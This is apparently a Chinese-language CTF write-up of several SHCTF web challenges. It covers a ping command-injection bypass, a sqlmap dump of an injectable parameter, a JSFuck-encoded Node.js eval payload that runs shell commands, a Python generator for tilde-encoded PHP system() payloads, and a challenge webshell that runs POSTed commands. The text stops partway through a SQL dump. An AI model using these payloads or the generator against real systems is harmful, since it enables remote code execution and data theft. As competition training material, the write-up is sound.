# SHCTF 3rd web复现

不算特别难的题目，对我这种小白来说比较友好(

可惜这场没怎么认真打😔

## **ez-ping**

[CTFping命令绕过及符号用法](https://blog.csdn.net/Hardworking666/article/details/120739082)

虽然是经典题型但是之前确实没做过这类题(羞

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NDI4ODI1OTJiNWFkOTY3ZmM1ZmVhZjZkNmU1ZjJkMjdfQVlUdGFwOHJMY0dRMVVtWjQ4cFc4eElHMzdPa3hybVBfVG9rZW46TnNsQmJmak1Tb2ljTnN4bnF6NWNuRXhvbnpjXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

`cat` `flag` `*` `tac` 等被过滤,能用的还是挺多的

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjFkYzk3MzUwN2U0YjQxNjc2OGY0MWIwZjYzZTVmNDRfd2U4REV4UlBjS2E2Ym9EemFQeGhwZTNBRXB4N3Q5U0pfVG9rZW46Tlh0dWJBdDVUbzNwbDN4UFpwa2N1YWlublNjXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

## **上古遗迹档案馆**

题目已经提示sql注入了，`1'`回显报错信息

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NmViODc5ZWVhOTI2NjNkNTY1MzNhMTU3NGE3ZTE4ODBfcDlYZ2lNdDFXb2pzc0FhTEpZcnFYR3l0M1owOG55NnJfVG9rZW46U1o4cmJvdGV3b3FGR1J4bXBzamNBR3lWbmpkXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

`1' or 1=1 #`和`1' or 1=2 # `均正常回显，判断为报错注入

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NDUwNGViZjRkMDRjZTk4Mzk3NzVmOGU5MTIzNWIwY2ZfWGpXWTFRV3JrVGdzSkoxWWJ2TGRkbTdkSGhUdzcxMGdfVG9rZW46SFlqM2J4Y1JHb3J4Ynd4cXdlVGNiOU5mbmtnXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

`sqlmap -u "``http://challenge.shc.tf:32695?id=2``" --batch -D archive_db -a`一把梭

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NTdlMWE5ZGE2MDc3OWQyZTA1NDgyYzcxMjRlMmJjYjBfaGZIa0RNQ2lvd3BiMHhrNE1LOWh5dmxwNWRwTDZCc0FfVG9rZW46TzU5N2JsN3dGb2R4eHJ4V0pzOGNEVjU5bmJJXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

## **calc?****js****?fuck!**

源码简单粗暴，设置了白名单然后直接eval，考察JSFuck构造命令

```JavaScript
const express = require('express');
const app = express();
const port = 5000;

app.use(express.json());

const WAF = (recipe) => {
    const ALLOW_CHARS = /^[012345679!\.\-\+\*\/\(\)\[\]]+$/;
    if (ALLOW_CHARS.test(recipe)) {
        return true;
    }
    return false;
};

function calc(operator) {
    return eval(operator);
}

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.post('/calc', (req, res) => {
    const { expr } = req.body;
    console.log(expr);
    if(WAF(expr)){
        var result = calc(expr);
        res.json({ result });
    }else{
        res.json({"result":"WAF"});
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});    
```

Payload

- `[]`：空数组
- `[]["flat"]`：空数组的flat方法，结果是flat函数方法
- `[]["flat"]["constructor"]`：flat的构造器，在 JavaScript 中，所有函数都是 Function 的实例，结果为Function 本身

```JavaScript
[]["flat"]["constructor"]("return process.mainModule.require('child_process').execSync('cat /flag').toString()")()
```

JSFuck编码https://atlai.cn/tool_page/js_fuc

```JavaScript
[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+([][[]]+[])[+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+([][[]]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])())
```

直接`global.process.mainModule.require('child_process').execSync('cat /flag').toString()`也是可以的

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGQ4ZmE3ZGM0NDEzMjYzMDk1OGY5MzUxMDhjNDQ2NzRfMm5xUkpCVFdBRWtPblFjZzh5TEx2SUdXZldPNHZiYmpfVG9rZW46TGNzdWJXZGRtbzlpMVN4Q0lqb2NHN2xDbnRoXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

## **kill_king**

打开新网页的开发者工具再进容器，查看源码，将result=win以post发送到check.php

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MjNkMThjOTYwMTdkODQzM2ZiMWUyODRhYzlhNDg0YTRfZzAyMlpiTGpWSWx2SHdDemRkSXdWdDRscmFYU0lWOVBfVG9rZW46RENkVGJjWDlXb0JRMEN4cng0emM2V2MybjFmXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

出现了神秘小代码

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=YzViOTBjY2NkOGEzMWM5MWI1ZGU1YTYwMjFmNDlkMWVfRjFhRGRoU3VtZ1JlTVRuNUxLMkIwaEVtaUVrSFppOWdfVG9rZW46RzFtb2IzdTdPb2M5TjJ4djR0NGM5ZDFWbjJjXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

```PHP
<?php
// 国王并没用直接爆出flag，而是出现了别的东西？？？
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['result']) && $_POST['result'] === 'win') {
        highlight_file(__FILE__);
        if(isset($_GET['who']) && isset($_GET['are']) && isset($_GET['you'])){
            $who = (String)$_GET['who'];
            $are = (String)$_GET['are'];
            $you = (String)$_GET['you'];
        
            if(is_numeric($who) && is_numeric($are)){
                if(preg_match('/^\W+$/', $you)){
                    $code =  eval("return $who$you$are;");
                    echo "$who$you$are = ".$code;
                }
            }
        }
    } else {
        echo "Invalid result.";
    }
} else {
    echo "No access.";
}
?>
```

`$who`和`$are`为数字，`$you`为非字母组成的字符串，然后直接eval，考察点为无字母数字执行命令

网上的脚本很多，关键在于如何执行$you的命令，这里我用的三目运算

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MDc3NTQ5ZDFiM2NjY2U2ZWMyN2FmYjc0OWVkNmRkZGJfSGF4ejhpS2lhczdjUTF4QVNDSnNpVDRNMkh3UmIwcGxfVG9rZW46UjA3YmI4Q1E3b3lPNmh4dnY3ZmNnOXVRblljXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

然后贴一下[RisingFan](https://blog.csdn.net/RisingFan)师傅的脚本，通过.连接执行命令

```Python
import urllib.parse
 
def generate_payload(command, function="system"):
    """
    针对特定的 PHP eval 漏洞环境构造全符号 Payload
    模板:  . (~函数名)(~参数) . 
    """
    
    def tilde_encode(string):
        """对字符串的每个字符进行位取反并转换为 URL 编码格式"""
        result = ""
        for char in string:
            # 执行位取反 (~)，PHP 的取反相当于与 0xff 异或
            encoded_char = hex(ord(char) ^ 0xff)[2:].upper()
            result += f"%{encoded_char}"
        return result
 
    # 1. 对函数名进行取反编码 (默认 system)
    func_part = tilde_encode(function)
    
    # 2. 对命令参数进行取反编码
    cmd_part = tilde_encode(command)
    
    # 3. 按照你测试成功的“唯一正确模板”进行拼接
    # %20 是空格，防止数字与点号连用导致的语法错误
    payload = f"%20.%20(%7E{func_part})(%7E{cmd_part})%20.%20"
    
    return payload
 
# --- 使用示例 ---
if __name__ == "__main__":
    print("--- PHP Eval RCE Payload 生成器 ---")
    cmd = input("请输入你想执行的系统命令 (例如 'ls /' 或 'cat /flag'): ")
    
    final_payload = generate_payload(cmd)
    
    print("\n[生成的 Payload 内容]:")
    print(final_payload)
    print("\n[完整的 URL 传参参考]:")
    print(f"?who=1&are=1&you={final_payload}")
```

## **05_em_v_CFK**

dirsearch目录扫描

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjU5MmZjNDUzZTI0MDVlMjdkYWJlZjRjMzM5YzBlMGFfNlZPOUZBVDI3NG55eVdQZm8yTUpKWXV5TkhTWEJSSlZfVG9rZW46UTZLQ2JxZnpob1FPYkx4Z21xY2NIRGtMbjJiXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

查看源码发现注释

```HTML
.alert {
/*5bvE5YvX5Ylt5YdT5Yvdp2uyoTjhpTujYPQyhXoxhVcmnT935L+P5cJjM2I05oPC5cvB55dR5Mlw6LTK54zc5MPa */
            margin-top: 20px;
            padding: 10px;
            background: #ffeeba;
            border: 1px solid #ffeeba;
            color: #856404;
            border-radius: 5px;
            word-break: break-all;
        }
```

b64解码内容为`我上传了个shell.php, 带上show参数get小明的圣遗物吧`

根据提示访问/uploads/shell.php?show，发现线索

```PHP
<?php

if (isset($_GET['show'])) {
    highlight_file(__FILE__);
}

$pass = 'c4d038b4bed09fdb1471ef51ec3a32cd';

if (isset($_POST['key']) && md5($_POST['key']) === $pass) {
    if (isset($_POST['cmd'])) {
        system($_POST['cmd']);
    } elseif (isset($_POST['code'])) {
        eval($_POST['code']);
    }
} else {
    http_response_code(404);
}
```

好眼熟的数字(悲

https://www.cmd5.com/default.aspx

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=YmZlNjhmNWVlMzJjYTExZDY4YjI4ZjQ1MThhMzQ1M2JfMHRycmt3VmxJaXRMeDVQSklLcEZkM2h3c0pVUXg5ZmlfVG9rZW46T2xQWmJCUzFBb3dmSkF4SmhwV2N4UVJHbmd5XzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

没找到flag，/var目录下有个数据库

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NTViNDFjNjc0NDI3NjZlY2RmMGZiNTI5Zjc3OWYyMWZfREd0emNvZmZSSkRYcndoTjE3QnFJVTZGdUU0dVZBZjVfVG9rZW46TXJFR2JwbWlsb2tBcnd4S3psZWMzcjRQbldTXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

给了数据库账号`ctf_user`密码`ctf_password_114514`

```SQL
CREATE DATABASE IF NOT EXISTS shop;
USE shop;

CREATE TABLE goods (
    id INT PRIMARY KEY,
    name VARCHAR(50),
    price DECIMAL(10, 2)
);

CREATE TABLE mess (
    id INT PRIMARY KEY,
    mess VARCHAR(100)
);

INSERT INTO goods VALUES (1, 'Free Tea', 0.00), (2, 'Icecream', 3.00),(3, 'Golden Flag', 50.00);

